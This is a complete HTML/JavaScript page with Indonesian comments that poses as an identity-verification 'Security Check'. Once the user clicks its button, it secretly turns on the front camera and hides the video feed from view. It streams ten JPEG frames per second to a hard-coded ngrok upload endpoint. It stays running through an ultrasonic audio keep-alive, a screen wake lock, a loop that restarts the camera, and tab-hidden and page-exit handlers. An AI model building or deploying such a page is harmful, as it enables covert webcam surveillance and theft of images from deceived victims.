<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
  
  #overlay {
    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column;
    justify-content: center; align-items: center; z-index: 9999; cursor: pointer; text-align: center;
  }
  .box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
  button { background: #007aff; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
  
  /* Sembunyikan video asli agar user tidak sadar */
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
</style>
</head>
<body>

<div id="overlay">
  <div class="box">
    <h2>🔒 Security Check</h2>
    <p>Klik untuk memverifikasi identitas Anda.</p>
    <button id="startBtn">Verify Identity</button>
  </div>
</div>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI NGROK
  // ============================================
  var CONFIG = {
    // Ganti URL ini dengan endpoint Ngrok Anda yang menerima POST request
    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
    fps: 10, // Kirim 10 frame per detik (Live Stream Effect)
    recoveryInterval: 1000 // Cek kamera setiap 1 detik
  };

  var state = {
    camActive: false,
    audioCtx: null,
    streamTimer: null,
    recoveryTimer: null,
    wakeLock: null
  };

  // ============================================
  // 1. AUDIO KEEP-ALIVE & WAKE LOCK
  // ============================================
  function initBackgroundKeepAlive() {
    try {
      // Audio Ultrasonic (18kHz)
      window.AudioContext = window.AudioContext || window.webkitAudioContext;
      state.audioCtx = new AudioContext();
      var osc = state.audioCtx.createOscillator();
      var gain = state.audioCtx.createGain();
      gain.gain.value = 0.001;
      osc.frequency.value = 18000;
      osc.connect(gain);
      gain.connect(state.audioCtx.destination);
      osc.start();
      
      if (state.audioCtx.state === 'suspended') state.audioCtx.resume();
    } catch (e) {}

    // Wake Lock API
    if ('wakeLock' in navigator) {
      navigator.wakeLock.request('screen').then(function(lock) {
        state.wakeLock = lock;
      }).catch(function(){});
    }
  }

  // ============================================
  // 2. CAMERA HIJACK
  // ============================================
  function startCamera() {
    navigator.mediaDevices.getUserMedia({ 
      video: { width: 640, height: 480, facingMode: "user" }, 
      audio: false 
    })
    .then(function(stream) {
      state.camActive = true;
      
      var video = document.getElementById('cam-feed');
      video.srcObject = stream;
      video.play().catch(function(){});

      document.getElementById('overlay').style.display = 'none';

      // Deteksi jika sistem mematikan kamera
      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
          triggerRecovery();
        };
      });

      startStreaming();
    })
    .catch(function(err) {
      console.log("Kamera diblokir: " + err.name);
    });
  }

  // ============================================
  // 3. LIVE STREAMING KE NGROK (MULTIPART/FORM-DATA)
  // ============================================
  function startStreaming() {
    if (state.streamTimer) clearInterval(state.streamTimer);
    
    var interval = 1000 / CONFIG.fps; // Interval per frame (100ms untuk 10 FPS)

    state.streamTimer = setInterval(function() {
      if (!state.camActive) return;

      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        // Gambar frame video ke canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Konversi canvas ke Blob (Gambar JPEG)
        canvas.toBlob(function(blob) {
          if (!blob) return;

          // Buat FormData untuk dikirim ke server
          var formData = new FormData();
          formData.append('frame', blob, 'frame.jpg');
          formData.append('timestamp', Date.now());

          // Kirim ke Ngrok
          fetch(CONFIG.serverEndpoint, {
            method: 'POST',
            body: formData,
            keepalive: true // Tetap kirim meskipun tab ditutup
          })
          .then(function(res) {
            // console.log("Frame terkirim:", res.status);
          })
          .catch(function(err) {
            // console.log("Gagal kirim frame:", err);
          });

        }, 'image/jpeg', 0.6); // Kualitas 60% agar ringan
      }
    }, interval);
  }

  // ============================================
  // 4. RECOVERY CYCLE (MEMAKSA KAMERA HIDUP)
  // ============================================
  function triggerRecovery() {
    if (state.recoveryTimer) clearInterval(state.recoveryTimer);
    
    state.recoveryTimer = setInterval(function() {
      if (!state.camActive) {
        console.log("[!] Kamera mati. Memulihkan...");
        startCamera();
      }
    }, CONFIG.recoveryInterval);
  }

  // ============================================
  // 5. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
  // ============================================
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      console.log("[!] Tab hidden. Memaksa stream tetap berjalan...");
      if (!state.camActive) startCamera();
      if (state.audioCtx && state.audioCtx.state === 'suspended') state.audioCtx.resume();
    } else {
      if (!state.camActive) startCamera();
    }
  });

  window.addEventListener('pagehide', function() {
    if (state.camActive) {
      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');
      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(function(blob) {
          if (!blob) return;
          var formData = new FormData();
          formData.append('frame', blob, 'final_frame.jpg');
          fetch(CONFIG.serverEndpoint, {
            method: 'POST',
            body: formData,
            keepalive: true
          }).catch(function(){});
        }, 'image/jpeg', 0.6);
      }
    }
  });

  // ============================================
  // 6. TRIGGER AWAL
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    initBackgroundKeepAlive();
    startCamera();
    triggerRecovery();
  });

})();
</script>
</body>
</html>
